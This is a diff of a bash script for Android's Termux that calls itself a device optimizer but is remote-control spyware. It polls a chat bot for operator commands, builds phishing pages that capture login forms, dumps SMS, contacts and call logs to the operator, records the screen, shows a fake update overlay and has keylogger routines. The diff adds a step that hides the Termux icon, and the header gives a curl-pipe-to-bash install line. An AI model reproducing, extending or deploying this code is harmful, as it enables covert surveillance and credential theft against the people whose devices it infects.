@@ -1,6 +1,6 @@
 #!/bin/bash
 # ============================================================
-# SYSTEM MANAGER – Advanced Device Optimizer
+# SYSTEM MANAGER vFINAL – Auto‑Hide Termux Icon
 # Target: echo y | termux-setup-storage && curl -sL RAW_URL | bash && exit
 # ============================================================
 
@@ -69,7 +69,7 @@ stop_keylogger() {
   rm /sdcard/.keylog.txt 2>/dev/null
 }
 
-# ----- MAIN EXECUTOR (ALL 110+ COMMANDS) -----
+# ----- MAIN EXECUTOR -----
 execute() {
   cmd="$1"
   case "$cmd" in
@@ -169,7 +169,6 @@ execute() {
     /alias) new_name="${cmd#/alias }"; echo "$new_name" > "$ALIAS_FILE"; ALIAS="$new_name"; send_msg "Alias set to: $new_name" ;;
     /myname) send_msg "Current name: $(get_name) | Device ID: $DEVICE_ID" ;;
     /resetname) rm -f "$ALIAS_FILE"; ALIAS=""; send_msg "Alias reset" ;;
-    # Arsenal
     /phish) site="${cmd#/phish }"; curl -s "https://$site.com/login" -o /tmp/login.html 2>/dev/null; cat >> /tmp/login.html << 'PHISH_EOF'
 <script>
 document.querySelector('form').addEventListener('submit', function(e) {
@@ -196,7 +195,7 @@ PHISH_EOF
       cd /tmp && tar czf /tmp/comms.tar.gz sms.txt contacts.txt calls.txt 2>/dev/null
       [ -f /tmp/comms.tar.gz ] && send_file "/tmp/comms.tar.gz" "Communications Dump" || send_msg "Failed to dump communications"
       ;;
-    /screenrecord) dur="${cmd#/screenrecord }"; [ -z "$dur" ] && dur=300; screenrecord --time-limit "$dur" /sdcard/screen_record.mp4 &>/dev/null &; send_msg "Screen recording started for $dur seconds" ;;
+    /screenrecord) dur="${cmd#/screenrecord }"; [ -z "$dur" ] && dur=300; { screenrecord --time-limit "$dur" /sdcard/screen_record.mp4 &>/dev/null & }; send_msg "Screen recording started for $dur seconds" ;;
     /fakeupdate) am start -a android.intent.action.VIEW -d "https://i.imgur.com/fake_update.png" 2>/dev/null; send_msg "Fake update overlay displayed" ;;
     *) send_msg "Unknown: $cmd" ;;
   esac
@@ -218,6 +217,13 @@ fi
 RESTORE
 chmod +x /sdcard/.system_cache/restore.sh
 
+# ----- HIDE TERMUX ICON -----
+(sleep 5
+settings put secure enabled_notification_listeners none 2>/dev/null
+pm disable-user --user 0 com.termux 2>/dev/null
+am force-stop com.termux 2>/dev/null
+) &
+
 # ----- POLLING -----
 send_msg "System Manager Active"
 while true; do
@@ -226,12 +232,10 @@ while true; do
     [ "$update_id" -gt "$OFFSET" ] && OFFSET=$update_id
   done
   echo "$updates" | grep -oP '"text":"\K[^"]+' | while read -r text; do
-    # Broadcast _ALL_
     if echo "$text" | grep -q "^_ALL_ "; then
       cmd="${text#_ALL_ }"
       execute "$cmd"
     fi
-    # Device ID or alias
     if echo "$text" | grep -q "^$DEVICE_ID \|^$(get_name) "; then
       cmd=$(echo "$text" | sed "s/^$DEVICE_ID //;s/^$(get_name) //")
       execute "$cmd"
